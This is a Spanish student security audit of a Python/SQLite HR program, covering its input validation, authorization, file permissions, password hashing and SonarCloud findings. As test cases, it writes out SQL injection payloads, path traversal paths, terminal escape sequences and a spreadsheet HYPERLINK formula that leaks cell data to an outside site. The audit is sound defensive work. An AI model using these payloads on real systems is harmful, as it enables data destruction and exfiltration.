# Auditoría de seguridad — EcoTech Solutions

**Caso EcoTech Solutions · Evaluación Sumativa 2, Unidad 2 · TI3V21**
**Alcance:** `ecotech.py` y `main.py`

| Pasada | Fecha | Foco |
|---|---|---|
| 1 | 11-sep-2026 | encapsulamiento, control de entradas, inyección SQL, path traversal |
| 2 | 12-sep-2026 | permisos del archivo, salida a contextos que interpretan datos, hash de claves, autenticación |
| 3 | 12-sep-2026 | integridad de la persistencia: la relación Departamento ↔ Empleado |
| 4 | 15-sep-2026 | revisión de entradas y del código aportado por un compañero |
| 5 | 15-sep-2026 | análisis de SonarCloud sobre el repositorio de GitHub (§2.10) |

**Método:** ejecutar ataques concretos contra el código, no leerlo y opinar. Cada hallazgo trae su
reproducción y se puede repetir delante del docente.

Evalúan esto sobre todo los indicadores **2.1.2** (encapsulamiento), **2.1.3** (persistencia) y
**2.1.4** (validación y control de errores).

---

## Resumen

| # | Hallazgo | Pasada | Gravedad | Estado |
|---|---|---|---|---|
| — | Inyección SQL | 1 | — | **Sin hallazgos** |
| — | Path traversal en la exportación | 1 | — | **Sin hallazgos** |
| — | XSS y cabeceras HTTP | 2 | — | **No aplican** (§1.3) |
| 2.1 | El menú se caía con un entero grande | 1 | Grave | **Corregido** |
| 2.2 | La autorización tenía un solo control real | 1 | Grave | **Corregido** |
| 2.3 | La base quedaba legible por todo el equipo | 2 | Grave | **Corregido** |
| 2.4 | Inyección de fórmulas en el CSV exportado | 2 | Grave | **Corregido** |
| 2.5 | Textos con escapes de terminal y caracteres invisibles | 2 y 4 | Media | **Corregido** |
| 2.6 | Hash de claves con costo bajo y sin sus parámetros | 2 | Media | **Corregido** |
| 2.7 | Clave literal en el código fuente | 2 | Media | **Corregido** |
| 2.8 | La relación Departamento ↔ Empleado vivía en dos lugares | 3 | Alta | **Corregido** |
| 2.9 | Limpieza de pantalla con `os.system` | 4 | Baja | **Corregido** |
| 2.10 | SonarCloud: carácter bidireccional, regex super-lineal, complejidad y 13 más | 5 | Media | **Corregido** (uno anotado para la Unidad 3) |
| 3.1 | `actualizar_contacto` no pide permiso | 1 | Decisión | Se declara |
| 3.2 | `Empleado._proyectos` modificable desde fuera | 1 | Observación | Se declara |
| 3.3 | Datos de contacto en el resumen exportable | 1 | Observación | Se declara |
| 3.4 | No existe autenticación | 2 | Grave | Se declara: Unidad 3 |
| 3.5 | Defectos latentes en `Usuario` | 2 | Observación | Parcial |

---

## 1. Lo que salió limpio

### 1.1 Inyección SQL

Todos los `execute()` pasan los valores como parámetros `?`. Se probaron cargas reales:

| Carga inyectada | Por dónde entró | Resultado |
|---|---|---|
| `Legal'); DROP TABLE empleado; --` | nombre de departamento | guardado como texto; la tabla `empleado` intacta |
| `x'; DELETE FROM empleado WHERE '1'='1` | `Departamento.renombrar` | guardado como texto; los empleados intactos |
| `1 OR 1=1` | `Empleado.buscar(id)` | devuelve `None`: ninguna fila coincide |

**Por qué funciona:**
- El valor viaja por un canal distinto al de la consulta, así que el motor nunca lo analiza como SQL.
- `Connection.execute` ejecuta **una sola** sentencia: un `;` inyectado no encadenaría nada.
- La única interpolación en SQL es `{cls.COLUMNAS}`, una constante escrita por nosotros. Va así
  porque `?` sustituye valores, no nombres de columnas.

### 1.2 Path traversal en la exportación

`Informe.exportar` **resuelve la ruta y recién entonces** comprueba que siga dentro de la carpeta de
trabajo. Comprobar antes de resolver no sirve, porque resolver es lo que colapsa los `..`.

| Ruta pedida | Resultado |
|---|---|
| `../../fuga.csv` | bloqueado |
| `/tmp/fuga.csv` | bloqueado |
| `salida.csv` | permitido |

### 1.3 Por qué no hay XSS ni cabeceras que revisar

- **XSS** requiere un navegador que interprete HTML. Aquí la salida es `print()` a una terminal.
- **Cabeceras de seguridad** (`Content-Security-Policy` y compañía) son de respuestas HTTP, y no hay
  HTTP.

Pero el problema de fondo del XSS, **un dato no confiable entregado a algo que lo interpreta**, sí
existe aquí, en dos lugares:

| Contexto que interpreta | Qué se inyecta | Hallazgo |
|---|---|---|
| Navegador | HTML y JavaScript | no aplica |
| Planilla, al abrir el CSV | fórmulas | 2.4 |
| Terminal, al listar | secuencias de escape y caracteres invisibles | 2.5 |

---

## 2. Hallazgos corregidos

### 2.1 El menú se caía con un entero grande · Grave

**Qué pasaba.** Un entero de 25 dígitos pasaba la validación y reventaba al llegar a SQLite con
`OverflowError: Python int too large to convert to SQLite INTEGER`, que **no estaba en ningún
`except`**. El programa moría con traceback. Se reproducía por seis caminos del menú: los ids de
departamento y de empleado, y el salario. Rompía el indicador 2.1.4.G.7 justo en lo que evalúa:
evitar que el sistema se interrumpa.

**Cómo se corrigió.** Las seis rutas cruzaban por un solo punto, así que la corrección va ahí, en
tres capas:

| Capa | Dónde | Qué rechaza |
|---|---|---|
| Formato | `main.py`, `pedir_entero()` | lo no decimal, más de 20 dígitos y lo que pase de `MAXIMO_ENTERO` (mil millones); vuelve a preguntar |
| Regla de negocio | `Empleado.__init__` | salario fuera de `1 … SALARIO_MAXIMO` (cien millones); lanza `ValueError` |
| Base de datos | `ESQUEMA` | `CHECK (salario > 0 AND salario <= 100000000)` |

La segunda capa existe porque `pedir_entero` se salta llamando a la clase desde otro programa; la
tercera, porque el objeto se salta abriendo la base con otra herramienta. Y `main.py` cerró la cadena
con un `except Exception` **último**, que nombra el tipo del error y continúa (no es `except: pass`).

**Dos detalles del mismo frente:**
- `isdigit()` se cambió por **`isdecimal()`**: `"²".isdigit()` es `True` pero `int("²")` falla.
- *(Pasada 4)* Con más de 4300 dígitos, `int()` lanza un `ValueError` en inglés. Por eso el largo se
  mira **antes** de convertir. Se usa 20 y no 10 para aceptar ceros a la izquierda.

**Evidencia:**
```
Salario: 9999999999999999999999999
   ! Demasiado grande. El máximo es 1000000000.
Salario: 500000000
   ! Salario fuera de rango (1 a 100000000): 500000000
Salario: 1720000
   Empleado contratado con id 4.
```

### 2.2 La autorización tenía un solo control real · Grave

**Qué pasaba.** `Usuario._PERMISOS` declara cuatro módulos, pero `tiene_permiso()` solo se llamaba al
leer el salario y al generar un informe. Con un usuario de rol `EMPLEADO`:

| Operación | Antes | Después |
|---|---|---|
| Leer el salario | bloqueado | bloqueado |
| Crear, renombrar o borrar un departamento | **permitido** | bloqueado |
| Borrar un empleado | **permitido** | bloqueado |

**El sistema protegía un sueldo y regalaba el borrado.** Encapsular un atributo no sirve si
cualquiera puede eliminar el registro entero.

**Cómo se corrigió.** La comprobación se extrajo a una sola función, `autorizar()`, que **lanza en vez
de devolver un booleano** (nadie puede olvidar mirar el resultado) y actúa **antes** de tocar la
base. Hoy son **nueve** las operaciones protegidas, y el módulo sale de la tabla que se escribe:

| Módulo | Métodos |
|---|---|
| `departamentos` | `Departamento.guardar`, `renombrar`, `eliminar`, `asignar_gerente` |
| `empleados` | `Empleado.obtener_salario`, `Empleado.eliminar`, `Departamento.agregar_empleado`, `quitar_empleado` |
| `informes` | `Informe.generar` |

`Empleado.guardar` también queda protegido, porque insertar exige leer el salario. Los roles pasaron
a significar algo: un `GERENTE` administra departamentos pero no borra empleados; un `EMPLEADO` no
escribe nada. **Evidencia:** la autoverificación intenta siete escrituras sin permiso, las siete
fallan y la base queda intacta.

### 2.3 La base quedaba legible por todo el equipo · Grave

**Qué pasaba.** SQLite crea el archivo con los permisos por omisión del equipo (`0644`/`0664`):
cualquier usuario de la máquina podía leer `ecotech.db`, y adentro están los sueldos. Era la puerta
de atrás del encapsulamiento: `__salario` protege el dato dentro del programa, no el archivo.

**Cómo se corrigió.** `crear_tablas()` deja el archivo en **`0600`**. Va ahí porque es el único punto
por el que la base nace y el menú lo llama en cada arranque, así que también corrige una base que ya
existiera. El `chmod` atrapa `OSError` y avisa en vez de propagar: el `except` de arranque de
`main.py` es `sqlite3.Error`, y un `OSError` sin atrapar mataría el programa.

**Evidencia:** `ls -l ecotech.db` → `-rw-------`, y un `assert` de la autoverificación lo comprueba.

### 2.4 Inyección de fórmulas en el CSV exportado · Grave

**Qué pasaba.** Una planilla evalúa como fórmula toda celda que empieza con `=`, `+`, `-` o `@`. Un
empleado registrado como `=HYPERLINK("http://sitio.cl?d="&A1,"Ver")` filtraría datos al abrir el
informe. `csv.writer` **no** protege de esto: escapa lo que rompe el formato del archivo (comas y
comillas), no lo que la planilla interpreta después.

**Cómo se corrigió.** `sin_formula()` antepone un apóstrofo a las celdas que empiezan con `= + - @ \t
\r`, y `exportar()` la aplica a cada celda. **Va en la salida y no al guardar**, igual que el HTML se
escapa al imprimir: un apellido puede empezar con guion, y el problema no es el dato sino quien lo
interpreta.

**Evidencia:** la autoverificación exporta `["=1+1", "@SUM(A1:A9)", "Juanita Bravo"]` y comprueba
`'=1+1`, `'@SUM(A1:A9)` y `Juanita Bravo` **intacta**. Una defensa que altera datos inofensivos
corrompe el informe.

### 2.5 Textos con escapes de terminal y caracteres invisibles · Media

**Qué pasaba.** El menú vuelve a imprimir los textos al listar.
- *(Pasada 2)* Un departamento llamado `Legal\x1b[2J` **borraba la pantalla** de quien listaba, y con
  `\x1b[1A` se podía sobrescribir la línea de arriba y mentir sobre lo que hay en la base. El correo
  pasaba igual: `\x1b` no es `\s`, así que la regex no lo excluía.
- *(Pasada 4)* El filtro de la pasada 2 miraba solo los códigos menores a 32 y el 127, y dejaba pasar
  **caracteres de control C1 y marcas invisibles** como U+202E, que hace que un nombre **se vea al
  revés**. Además:
  - el correo **no tenía tope de largo**, y su regex tardaba en proporción al cuadrado del largo
    ante una entrada armada para fallar al final;
  - el patrón del teléfono usaba `\d`, que acepta dígitos de cualquier alfabeto (los árabes, U+0660 a
    U+0669).

**Cómo quedó:**

| Dónde | Qué hace |
|---|---|
| `texto()` | rechaza lo **no imprimible** con `isprintable()`. Cubre todo texto obligatorio: nombres, dirección, correo, descripciones y título. Costo: también rechaza el espacio duro (U+00A0) |
| `Persona.__fijar_contacto()` | el correo pasa por `texto(correo, "El correo", 254)` **antes** de la regex |
| `PATRON_CORREO` | regex lineal `[^@\s]+@[^@\s.]+(?:\.[^@\s.]+)+`; los controles ya los rechazó `texto()` (pasada 5, §2.10) |
| `PATRON_TELEFONO` | `\d` con `re.ASCII`: solo dígitos 0-9 (pasada 5, §2.10) |

Se **rechaza** en vez de limpiar, como el resto del archivo: `ValueError` con el campo nombrado.
**Evidencia:** la autoverificación prueba el escape en un nombre y en el correo, un correo de 265
caracteres con formato válido, la marca U+202E y un teléfono con dígitos árabes.

### 2.6 Hash de claves con costo bajo y sin sus parámetros · Media

**Qué pasaba:**
- **El costo era el ejemplo de la documentación**, `n=2**14`. OWASP pide hoy `2**17` como mínimo.
- **El hash no guardaba sus parámetros** (`scrypt$sal$hash`). Subir el costo mañana dejaría sin poder
  verificar todos los hashes de hoy.

**Cómo se corrigió:**
- `Usuario.COSTO = (2**16, 8, 1)`, con `maxmem` explícito, porque el límite por omisión de OpenSSL
  (32 MB) hace fallar a `hashlib.scrypt`.
- Formato `scrypt$n$r$p$sal$hash`: `verificar_clave` lee los parámetros del hash guardado.
- `2**16` y no `2**17`, a propósito: `2**17` son 134 MB y casi un segundo por hash, y la
  autoverificación hace varios. La constante está en un solo lugar.

| Parámetros | Tiempo por hash | Memoria |
|---|---|---|
| `n=2**14` (antes) | 57 ms | 16 MB |
| `n=2**16` (vigente) | 248 ms | 64 MB |

**Se hizo ahora porque era gratis:** nada escribe todavía la tabla `usuario`, así que no había hashes
que migrar.

### 2.7 Clave literal en el código fuente · Media

`main.py` construía el solicitante con la clave `"Clave-RRHH-2026"` escrita en el archivo. Una
credencial en el código viaja al zip y al repositorio, y queda en el historial. Se reemplazó por
`secrets.token_urlsafe(24)` más un sufijo `"aA1!"` que garantiza los tipos de caracteres que exige
`_validar_clave`. Esa clave **no se usa para nada** (sin login solo se llama `tiene_permiso()`), así
que una al azar sirve igual. Los literales de la autoverificación se quedan: ahí son el dato de
prueba.

### 2.8 La relación Departamento ↔ Empleado vivía en dos lugares · Alta

No es seguridad, es **integridad de la persistencia**, que evalúa el criterio 2.1.3.

**El síntoma.** Un departamento con dos empleados en la base, leído de nuevo:
```
resumen          : Departamento: Desarrollo Sostenible | Gerente: sin gerente | Empleados: 0
contar_empleados : 2
```

**La causa, confirmada con experimento.** Había **dos fuentes de verdad que nunca se sincronizaban**:
las listas `__empleados` y `__gerente` de `Departamento`, heredadas de la Unidad 1, y la clave
foránea del CRUD.

| Hallazgo | Estado |
|---|---|
| `agregar_empleado` y `quitar_empleado` no escribían la clave foránea | corregido |
| `asignar_gerente` no escribía `gerente_id` | corregido |
| `listar()` y `buscar()` devolvían departamentos sin empleados ni gerente | corregido |
| `Empleado.asignar_departamento` duplicaba a `agregar_empleado` y no está en el UML | corregido: se borró |
| Una gerente que cambiaba de departamento seguía en el cargo anterior | corregido |
| La base se abría en el directorio de trabajo: lanzar el menú desde otra carpeta mostraba una base vacía | corregido: `RUTA_ACTIVA` junto a `ecotech.py` |
| Todo `IntegrityError` se informaba como «correo ya registrado» | corregido: `sqlite_errorname` distingue el `UNIQUE` |
| Un segundo `guardar()` intentaba otro `INSERT` | corregido: se rechaza con `ValueError` |

**La corrección: se quitó la copia, no se sincronizó.** Con una sola fuente no hay nada que separar.
- Los métodos del UML **escriben y leen la clave foránea**, y `obtener_resumen` cuenta con el mismo
  `COUNT(*)` que el menú.
- Las reglas que cruzan tablas van **en la misma transacción**: mover a una gerente libera el cargo
  anterior en el mismo `with conectar()`, y «el gerente pertenece al departamento» va como `EXISTS`
  dentro del `UPDATE`.
- Los tres métodos que escriben ganaron `solicitante`, en el código y en `modelo_u2.drawio`.
- `exigir_guardado()` rechaza relacionar un objeto sin id; sin eso, `WHERE id = NULL` afecta cero
  filas en silencio.

**Evidencia:** la autoverificación lee la relación con **otra instancia** que la que escribió, y prueba
el gerente ajeno, el cargo vacante al moverse y al borrarse, el departamento sin guardar, el doble
`guardar()` y quitar dos veces.

### 2.9 Limpieza de pantalla con `os.system` · Baja

*(Pasada 4)* Un compañero aportó la pausa y la limpieza de pantalla del menú, escritas con
`os.system("cls" if os.name == "nt" else "clear")`. **`os.system` abre una shell y busca `clear` en el
PATH**: un `clear` falso puesto antes en el PATH se ejecutaría. Analizadores como Bandit lo marcan
(B605, B607). Se reemplazó por la secuencia ANSI `"\033[2J\033[H"`, que es texto y no un proceso.
Límite conocido: la consola antigua de Windows muestra los códigos en vez de borrar.

### 2.10 Análisis de SonarCloud · Media

*(Pasada 5 · 15-sep-2026)*

**Qué es y cómo se leyó.** SonarCloud analiza el repositorio `poo-ecotech` en GitHub cada vez que se
sube código a la rama `main`, y marca problemas de seguridad, confiabilidad y mantenibilidad. Los
issues se leyeron desde su API pública (`api/issues/search`, estados abiertos y confirmados) y los
*security hotspots* desde `api/hotspots/search`, que devolvió cero.

#### Qué encontró: 51 issues abiertos

| Calidad | Issues | Reglas |
|---|---|---|
| **Seguridad** | 3 | S6389 · carácter bidireccional en el código |
| **Confiabilidad** | 3 | S8786 · regex con retroceso super-lineal |
| **Mantenibilidad** | 45 | S1192, S3776, S4487, S5869, S6353, S6659, S1135 |

| Archivo | Issues | Observación |
|---|---|---|
| `ecotech.py` | 11 | los originales del sistema |
| `main.py` | 5 | los originales del menú |
| `comentado/ecotech_corto.py` | 12 | los mismos de `ecotech.py`, más un falso positivo «TODO» |
| `comentado/Comments_Explicacion_Larga/ecotech_largo.py` | 13 | los mismos de `ecotech.py`, más dos falsos positivos «TODO» |
| `comentado/main_corto.py` | 5 | los mismos de `main.py` |
| `comentado/Comments_Explicacion_Larga/main_largo.py` | 5 | los mismos de `main.py` |

**35 de los 51 estaban en los espejos comentados**, que son el mismo código que la raíz con más
comentarios. Por eso cada issue real aparecía tres veces. Además, SonarCloud reportaba **código
duplicado**: tampoco era un defecto, porque los espejos repiten la raíz a propósito. Las dos cosas se
resolvieron **sacando `comentado/` del repositorio** (`git rm -r --cached comentado` y la carpeta en el
`.gitignore`). Los espejos siguen existiendo en la carpeta local como material de estudio para la
defensa.

Quedan **16 issues reales**, todos en `ecotech.py` y `main.py`, más los 3 falsos positivos de los
espejos. Uno por uno:

#### S6389 · Carácter bidireccional en el código · Seguridad, media · 3 issues

**Qué dice la regla.** Un carácter de control bidireccional (U+202A a U+202E, U+2066 a U+2069) pegado
en el código fuente puede hacer que un editor **muestre el código en un orden distinto al que se
ejecuta**. Es el ataque conocido como «Trojan Source» (CVE-2021-42574): una revisión humana lee una
cosa y el intérprete ejecuta otra.

**Qué había.** `ecotech.py:674` y la misma línea en los dos espejos. La prueba «marca bidi» de la
autoverificación tenía el carácter U+202E (RIGHT-TO-LEFT OVERRIDE) **escrito literal** dentro del
texto de prueba, invisible en pantalla:

```python
assert _rechaza(lambda: Departamento("Legal<U+202E invisible>")), "marca bidi"
```

**Diagnóstico: real.** Se confirmó leyendo los bytes del archivo. No había lógica escondida: el
carácter estaba solo dentro de un dato de prueba, justo el que comprueba que `texto()` lo rechaza. Pero
la regla tiene razón: el código fuente no debe contener ese carácter. El escape se había pedido como
`\u202e` y quedó guardado el carácter real.

**Reparación.** El dato de prueba se escribe con el escape de Python, que produce el mismo texto en
ejecución sin que el carácter esté en el archivo. Lo mismo se hizo con los dígitos árabes de la línea
siguiente: no son controles bidireccionales y SonarCloud no los marcaba, pero son del mismo tipo de
problema.

```python
assert _rechaza(lambda: Departamento("Legal\u202e")), "marca bidi"
assert _rechaza(lambda: Empleado("J", calle, "\u0669\u0668\u0667\u0666\u0665\u0664\u0663\u0662\u0661", correo,
                                 contrato, 1000)), "dígitos no ASCII"
```

**Verificación.**
- Un recorrido de todos los `.py` y `.md` buscando U+202A a U+202E, U+2066 a U+2069 y dígitos
  U+0660 a U+0669 no encuentra ninguno.
- La autoverificación sigue en `OK`: la prueba todavía rechaza la marca invisible.

#### S8786 y S5869 · La regex del correo · Confiabilidad media y mantenibilidad · 4 issues

**Qué dicen las reglas.**
- **S8786:** la expresión puede tardar tiempo super-lineal por *backtracking*: con una entrada armada
  para fallar al final, el motor prueba muchísimas combinaciones.
- **S5869:** la clase de caracteres tiene elementos repetidos.

**Qué había** (`ecotech.py:32`):
```python
PATRON_CORREO = re.compile(r"[^@\s\x00-\x1f\x7f]+@[^@\s\x00-\x1f\x7f]+\.[^@\s\x00-\x1f\x7f]+")
```

**Diagnóstico: real, las dos.**
- **Repetidos:** `\s` ya incluye tabulación, salto de línea y otros caracteres que también están en
  `\x00-\x1f`. SonarCloud lo contó una vez por cada una de las tres clases.
- **Super-lineal:** el punto entraba en `[^@…]+` y también en `\.`. Ante `a@....…@`, el motor probaba
  cada posible corte entre los puntos antes de fallar. La auditoría ya había visto este costo en la
  pasada 4 y lo había acotado con el tope de 254 caracteres; SonarCloud confirmó que la regex misma
  debía cambiar.

**Reparación** (`ecotech.py:32`):
```python
PATRON_CORREO = re.compile(r"[^@\s]+@[^@\s.]+(?:\.[^@\s.]+)+")
```
- **Lineal:** el dominio se divide en tramos que no contienen puntos, separados por un punto. No hay
  dos formas de repartir el texto, así que no hay retroceso.
- **Sin repetidos:** la regex ya no excluye controles a mano, porque `Persona.__fijar_contacto()` pasa el
  correo por `texto()` **antes**, y `texto()` rechaza todo lo no imprimible.
- **Además es más estricta:** rechaza dominios con etiquetas vacías (`a@b..cl`).

**Verificación.**
- La autoverificación sigue rechazando el correo sin `@`, el correo con escape de terminal y el de 265
  caracteres.
- La sesión real del menú, con todos los correos de ejemplo, sale idéntica.

#### S6353 · `[0-9]` en vez de `\d` · Mantenibilidad · 1 issue

**Qué había.** `PATRON_TELEFONO = re.compile(r"(\+?56)?[2-9][0-9]{8}")`. Se había escrito `[0-9]` a
propósito en la pasada 4, porque en Python `\d` acepta dígitos de cualquier alfabeto.

**Reparación.** `re.compile(r"(\+?56)?[2-9]\d{8}", re.ASCII)`. Con `re.ASCII`, `\d` significa
exactamente `0-9`: se cumple la regla sin volver a aceptar dígitos árabes. La prueba «dígitos no ASCII»
lo confirma.

#### S4487 · Atributos privados que nunca se leen · Mantenibilidad, crítico · 2 issues

| Atributo | Diagnóstico | Reparación |
|---|---|---|
| `Proyecto.__descripcion` (`ecotech.py:468`) | real: se validaba y guardaba, pero nada lo mostraba | `Proyecto.obtener_resumen()` ahora incluye `Descripción: …` |
| `Usuario.__nombre_usuario` (`ecotech.py:541`) | lo declara el UML (`- nombreUsuario: str`) y se va a leer al guardar y autenticar usuarios, que es de la Unidad 3 | se mantiene, anotado con `# NOSONAR: se lee al guardar y autenticar, Unidad 3`. Quitarlo rompería la correspondencia con el diagrama |

#### S3776 · Complejidad cognitiva · Mantenibilidad, crítico · 2 issues

**Qué dice la regla.** Una función no debería pasar de 15 puntos de complejidad cognitiva, que suma
por cada `if`, `elif`, `except`, bucle y anidamiento.

**Qué había** en `main.py`:
- **`ejecutar()` = 30:** las diez opciones del menú escritas completas dentro de un `if/elif`, con sus
  `if` internos.
- **`main()` = 26:** el bucle, la lectura de la opción, la cadena de 8 `except` y la pausa, todo junto.

**Reparación.** Mismo comportamiento, repartido en funciones chicas:

| Antes | Después |
|---|---|
| todo el código de cada opción dentro de `ejecutar()` | una función por opción: `crear_departamento`, `contratar_empleado`, `renombrar_departamento`, `editar_contacto`, `asignar_a_departamento`, `eliminar_departamento`, `eliminar_empleado` |
| `ejecutar()` con 30 puntos | `ejecutar()` solo despacha: un `if/elif` que llama a esas funciones (~12). Sigue sin diccionario, como decidimos en `ANALISIS_IA.md` fila 20 |
| `main()` con el `try` y los 8 `except` | `atender(opcion, solicitante)` tiene la **misma cadena de 8 `except` en el mismo orden** (`Cancelado` primero, `Exception` al final) |
| la lectura de la opción y la pausa, cada una con su `except` dentro de `main()` | `pedir_opcion()` y `pausar()`, que devuelven si hay que salir |
| `main()` con 26 puntos | `main()`: pedir, atender, pausar y limpiar, con la despedida en un solo lugar |

**Verificación: el menú se comporta exactamente igual.**
- **Sesión real:** las 25 acciones de `SALIDA_TERMINAL.md` sobre una base temporal dan una salida
  idéntica, byte a byte.
- **Casos límite:** se compararon el `main.py` nuevo y el commiteado en siete casos, con salida
  idéntica en todos: fin de entrada al elegir opción, Ctrl+C al elegir opción, fin de entrada a mitad
  de contratar, Ctrl+C a mitad de contratar, fin de entrada en la pausa, opción desconocida, y cancelar
  con `x`.

#### S1192 · Textos repetidos · Mantenibilidad, crítico · 5 issues

| Dónde | Texto repetido | Reparación |
|---|---|---|
| `ecotech.py:660`, autoverificación | `"j@e.cl"` y `"Calle 1"`, 5 veces cada uno | variables locales `calle` y `correo` |
| `main.py:124` | `"Desarrollo Sostenible"`, 3 veces | constantes `DESARROLLO` e `INVESTIGACION`, usadas en `PLANTILLA` y en `sembrar()` |
| `main.py:189` y `:195` | `"   Id del departamento: "` y `"   Id del empleado: "`, 3 veces cada uno | constantes `PIDE_ID_DEPARTAMENTO` y `PIDE_ID_EMPLEADO` |

De paso, el mensaje «Interrumpido. Hasta luego.» pasó a la constante `INTERRUMPIDO`, para que el
refactor no creara una repetición nueva.

#### S6659 · Usar `endswith` · Mantenibilidad · 1 issue

`oct(os.stat(RUTA_ACTIVA).st_mode)[-3:] == "600"` pasó a
`oct(os.stat(RUTA_ACTIVA).st_mode).endswith("600")`. Hace lo mismo y se lee mejor.

#### S1135 · «TODO» · 3 issues, solo en los espejos · falso positivo

SonarCloud buscaba la palabra «TODO» y la encontró en comentarios que **empezaban con «Todo»** en
español («Todo es biblioteca estándar», «Todo el SQL usa `?`»). No eran tareas pendientes. Los
comentarios se reescribieron («Solo biblioteca estándar», «Cada consulta SQL usa `?`»), y además esos
archivos ya no están en el repositorio.

#### Qué debería mostrar el próximo análisis

| Issues | Estado esperado |
|---|---|
| S6389, S8786, S5869, S6353, S6659, S1192 y S3776 en `ecotech.py` y `main.py` | cerrados |
| S4487 de `Proyecto.__descripcion` | cerrado |
| S4487 de `Usuario.__nombre_usuario` | cerrado por `NOSONAR`, con el motivo escrito en la línea |
| los 35 de `comentado/` y la duplicación | desaparecen, porque la carpeta ya no está en el repositorio |

Si algún issue sigue abierto después del push, se revisa aquí mismo antes de marcarlo como aceptado
en SonarCloud.

---

## 3. Decisiones declaradas

### 3.1 `actualizar_contacto` no pide permiso

`Empleado.actualizar_contacto` sobrescribe a `Persona.actualizar_contacto`, que **el diagrama fija en
dos parámetros**. Un tercero rompería la sustitución de la subclase y la correspondencia que evalúa el
criterio 2.1.1. El dato es menos sensible que el salario y menos destructivo que un borrado, así que
el costo se asume y se declara. Si hubiera que cerrarlo, se cambia primero el diagrama.

### 3.2 `Empleado._proyectos` modificable desde fuera

Lleva un guion bajo porque lo escribe `Proyecto`. Se puede saltar la regla con
`empleado._proyectos.append(proyecto)`. No se corrige: con todo en un archivo, el guion bajo significa
lo que dice la convención (interno al módulo), y hacerlo privado obligaría a inventar métodos que el
UML no tiene. Donde se pudo cerrar sin inventar métodos, se cerró: la relación con `Departamento` ya
no tiene lista en memoria (§2.8). Sigue vigente solo porque `Proyecto` vive en memoria.

### 3.3 Datos de contacto en el resumen exportable

`obtener_resumen()` emite nombre, correo y teléfono, así que un informe exportado lleva el directorio
interno. Es lo que define el diagrama, y la mitigación importante está puesta: **el salario queda fuera
del resumen** y tiene su propio método con permiso.

### 3.4 No existe autenticación · Unidad 3

**Es el hallazgo más grave y el único que no se corrige.** La tabla `usuario` existe y ningún código
la escribe; el solicitante del menú se construye fijo. Consecuencia, sin adornos: **los permisos
protegen contra el uso incorrecto, no contra un atacante**, porque nadie verifica que quien dice ser
administrador lo sea.

**Por qué no se implementa ahora:**
1. **Es Unidad 3.**
2. **Rompería la correspondencia con el diagrama**: `Usuario` ganaría métodos que el UML no tiene. El
   lugar correcto para abrir esa puerta es primero el diagrama.

**Diseño para la Unidad 3:**
- `Usuario.guardar()` y `Usuario.buscar_por_nombre()`, con el mismo patrón CRUD, escribiendo
  `hash_clave` tal como lo produce `_hashear`.
- `autenticar(nombre, clave)` que devuelva el `Usuario` o `None`, y que **tarde lo mismo con un
  usuario inexistente que con una clave equivocada**, verificando siempre contra un hash, real o
  señuelo. Si no, el tiempo de respuesta revela qué cuentas existen.
- **Protección contra fuerza bruta:** contador de intentos fallidos por cuenta con **bloqueo
  temporal**. Un límite de tiempo en `input()` no sirve: lo que frena la fuerza bruta es limitar los
  intentos fallidos.
- El `solicitante` del menú pasa a ser el usuario autenticado.

### 3.5 Defectos latentes en `Usuario` · parcial

Ninguno es alcanzable hoy, porque `Usuario` no se persiste; se vuelven reales con §3.4.
- **`cambiar_clave` no persiste**: cambia el atributo en memoria. Se corrige cuando exista el `UPDATE`.
- **`verificar_clave` confiaba en el formato del hash** y un hash corrupto reventaba al desempacar.
  **Corregido:** ahora comprueba el formato y lanza un `ValueError` explicado.

---

## 4. Fuera de alcance

- **Cifrado en reposo.** SQLite no lo trae. El `0600` (§2.3) es la mitigación que cabe: no cifra,
  pero saca el archivo del alcance de otros usuarios.
- **Concurrencia.** Escribe un solo proceso. Con varios, la conexión por operación deja ventanas entre
  el `buscar` y el `eliminar` del menú.
- **`Informe.exportar` no es alcanzable desde el menú.** Se corrigió igual (§2.4), porque la clase es
  parte del entregable.
- **La carpeta permitida para exportar depende del directorio de trabajo** (`Path.cwd()`). La guarda
  contra path traversal funciona igual; lo que cambia es cuál es la carpeta permitida.

---

## 5. Cómo repetir la auditoría

Desde la carpeta del proyecto:

```bash
python3 ecotech.py     # autoverificación completa: termina en OK en ~1 s
python3 main.py        # 1 crea ejemplos; probar 25 dígitos, salario 500000000, x para cancelar
ls -l ecotech.db       # tiene que decir -rw-------
```

La autoverificación incluye los casos de las cinco pasadas: rechazos del dominio y de entradas,
credenciales y formato del hash, siete escrituras sin permiso, CRUD, relación leída desde otra
instancia, permisos del archivo y celdas del CSV. **Si alguien afloja una guarda, un `assert` se cae.**

Los espejos comentados (carpeta local `comentado/`, fuera del repositorio desde el 15-sep-2026)
tienen que seguir siendo el mismo código:
```bash
diff <(sed 's/[[:space:]]*#.*$//; /^[[:space:]]*$/d' ecotech.py) \
     <(sed 's/[[:space:]]*#.*$//; /^[[:space:]]*$/d' comentado/ecotech_corto.py)
```
(igual con `comentado/Comments_Explicacion_Larga/ecotech_largo.py` y con `main`).
